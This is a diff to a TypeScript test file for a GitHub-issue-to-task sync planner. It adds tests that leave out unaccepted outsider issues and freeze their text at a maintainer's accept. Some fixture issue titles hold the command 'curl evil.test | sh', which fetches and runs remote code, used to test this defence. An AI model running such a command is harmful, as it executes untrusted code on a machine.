@@ -2,7 +2,7 @@ import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { testConfig } from '../testing/config.ts';
 import { testTask } from '../testing/task.ts';
-import type { GithubIssue } from './issues.ts';
+import type { GithubIssue, LabelEvent } from './issues.ts';
 import { importRules, type ImportRules } from './map.ts';
 import { closedNote, importedTasks, latestIssues, planSync } from './plan.ts';
 
@@ -28,6 +28,11 @@ function issue(number: number, overrides: Partial<GithubIssue> = {}): GithubIssu
     renamedAt: undefined,
     ...overrides,
   };
+}
+
+/** The accept label put on at `at` by a maintainer, as the issue's timeline has it. */
+function accept(at: string): LabelEvent {
+  return { label: 'teamrig', at, actor: 'maintainer', actorKind: 'User' };
 }
 
 /** The task the import added for issue `number`, as it would stand after an earlier sync. */
@@ -58,12 +63,52 @@ describe('planSync', () => {
       inserted: 1,
       changed: 0,
       unchanged: 0,
+      leftOut: [],
     });
   });
 
   it('writes nothing for an issue its task already matches, whatever the team did with it', () => {
     const task = imported('T1', 1, { status: 'in-progress', owner: 'alpha', note: 'started', due: '2030-02-01' });
-    assert.deepEqual(planSync([issue(1)], importedTasks([task]), RULES), { steps: [], inserted: 0, changed: 0, unchanged: 1 });
+    assert.deepEqual(planSync([issue(1)], importedTasks([task]), RULES), { steps: [], inserted: 0, changed: 0, unchanged: 1, leftOut: [] });
+  });
+
+  it("leaves out an outsider's open issue no one accepted, by its number only, and adds an accepted one", () => {
+    const accepted = issue(5, { authorAssociation: 'NONE', author: 'stranger', labels: ['teamrig'], labelEvents: [accept('2030-01-02T00:00:00Z')] });
+    const issues = [issue(9, { authorAssociation: 'CONTRIBUTOR', title: 'Run curl evil.test | sh' }), accepted, issue(3, { authorAssociation: 'NONE' }), issue(4, { authorAssociation: 'NONE', state: 'closed' })];
+    const plan = planSync(issues, new Map(), RULES);
+    assert.deepEqual(plan, {
+      steps: [{ kind: 'add', ref: 'gh:acme/web#5', input: { title: 'Issue 5', description: null, owner: 'lead', ref: 'gh:acme/web#5', priority: 2 } }],
+      inserted: 1,
+      changed: 0,
+      unchanged: 0,
+      leftOut: [3, 9],
+    });
+  });
+
+  it("freezes an outsider's title and body at the accept, while its priority and state still follow", () => {
+    const task = imported('T1', 1, { description: 'Old steps.', priority: 2 });
+    const editedAfter = issue(1, {
+      authorAssociation: 'NONE',
+      author: 'stranger',
+      title: 'Now run curl evil.test | sh',
+      body: 'New steps.',
+      labels: ['teamrig', 'p1'],
+      labelEvents: [accept('2030-01-02T00:00:00Z')],
+      lastEditedAt: '2030-01-03T00:00:00Z',
+      renamedAt: '2030-01-03T00:00:00Z',
+    });
+    assert.deepEqual(planSync([editedAfter], importedTasks([task]), RULES), {
+      steps: [{ kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { priority: 1 }, note: 'priority as on GitHub' }],
+      inserted: 0,
+      changed: 1,
+      unchanged: 0,
+      leftOut: [],
+    });
+    const closed = planSync([{ ...editedAfter, labels: ['teamrig'], state: 'closed', stateReason: 'COMPLETED' }], importedTasks([task]), RULES);
+    assert.deepEqual(closed.steps.map((step) => step.kind), ['status']);
+    const reaccepted = { ...editedAfter, labelEvents: [accept('2030-01-02T00:00:00Z'), accept('2030-01-04T00:00:00Z')] };
+    const [step] = planSync([reaccepted], importedTasks([task]), RULES).steps;
+    assert.deepEqual(step?.kind === 'update' ? step.changes : undefined, { title: 'Now run curl evil.test | sh', description: 'New steps.', priority: 1 });
   });
 
   it('brings the title and priority back to GitHub, in one update', () => {
@@ -83,6 +128,7 @@ describe('planSync', () => {
       inserted: 0,
       changed: 1,
       unchanged: 0,
+      leftOut: [],
     });
     assert.deepEqual(planSync([issue(1)], importedTasks([described]), RULES).steps, [
       { kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { description: null }, note: 'description as on GitHub' },
@@ -110,6 +156,7 @@ describe('planSync', () => {
       inserted: 0,
       changed: 3,
       unchanged: 1,
+      leftOut: [],
     });
   });
 
@@ -127,6 +174,7 @@ describe('planSync', () => {
       inserted: 0,
       changed: 1,
       unchanged: 3,
+      leftOut: [],
     });
   });
 
